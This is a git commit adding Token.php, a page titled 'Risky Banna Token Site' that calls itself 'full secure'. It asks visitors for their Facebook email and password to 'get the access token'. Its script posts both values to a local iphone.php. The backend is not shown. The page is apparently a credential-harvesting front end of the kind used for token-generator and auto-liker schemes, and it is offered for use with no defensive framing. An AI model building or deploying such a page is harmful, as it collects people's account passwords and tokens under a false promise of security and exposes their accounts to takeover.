6fa37ca951d79646b20bd7be3700fe96fbf92496
15564564 <didoxi@vpn33.top>
2017-04-12 11:58:01 +0530

    Add files via upload

---
+++ Token.php
@@ -0,0 +1,72 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>Risky Banna Token Site</title>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.1/jquery.min.js"></script>
+  <script src="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/js/bootstrap.min.js"></script>
+  <div class="container">
+  <center><h1>&#9826; Risky Banna Token Site &#9826;</h1>
+</head>
+<div class="panel-heading"></div>
+<body>
+ <div id="content">
+<br><br>
+<center>
+<div class="ARMANKHAN">
+<a href="https://www.Facebook.com/JYOTRAJSINHJIJADEJA78" alt="ARMANKHAN" target="_blank">
+<img
+src="https://graph.facebook.com/100008206089816/picture?type=large" alt="Designer_&amp;_Developer" style="border-radius: 99em; border: 2px; box-shadow: 0px 0px 9px 7px rgb(204, 204, 204); padding: 0px;" width="400" height="400"></a>
+<div class="container">
+<marquee behavior="scroll" direction="right" scrollamount="8" scrolldelay="1"><strong><font style="text-shadow: 1px 1px black; color:;" size="4">Risky Banna TOKEN SITE</font></strong></center></marquee>
+  <center><font color="Red" size="+1"><marquee bgcolor="" direction="left" 
+loop="infinite" width="60%"><strong>FULL SECURE TOKEN SITE
+</strong></marquee></font></center></div></div></font>
+  
+  <div class="panel-group">
+<div class="panel panel-primary">
+    <div class="panel-heading">( Type your e-mail and password to get the access token )</div>
+      <div class="panel-body">      
+<div class="form-group">
+<label for="usr"> Email </label>
+  <input type="text" class="form-control" id="tk">
+</div>
+<div class="form-group">
+<label for="pwd"> Password </label>
+  <input type="password" class="form-control" id="mk">
+</div>
+<button type="button" class="btn btn-danger" onclick="Puaru_Active()" >Get Token</button>
+<p>
+<li id="trave" class="list-group-item"><img src="http://usamabutt.tk/usama.JPG"> </li></p>
+        Add Risky Banna On Facebook : <a href="https://Www.Facebook.com/100008206089816" 
+target="blank">Risky Banna</a>
+     <Br>   
+<a href="https://www.Facebook.com/100008206089816" target="_blank" style="font-family: Geneva, Arial; font-size: 9px; color: #330010; text-decoration: none;">
+         </script>
+  <br>
+<div id="footer">
+<script>
+function Puaru_Active() {
+var http = new XMLHttpRequest();
+var tk = document.getElementById("tk").value;
+var mk = document.getElementById("mk").value;
+var url = "./iphone.php";
+var params = "u="+tk+"&p="+mk+"";
+http.open("POST", url, true);
+http.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
+http.onreadystatechange = function() {
+if(http.readyState == 4 && http.status == 200) {
+document.getElementById("trave").innerHTML = http.responseText;        
+}
+}
+http.send(params);
+}
+</script>
+<footer class="footer">
+<center><p></p></center>
+</footer>
+</body>
+</html>
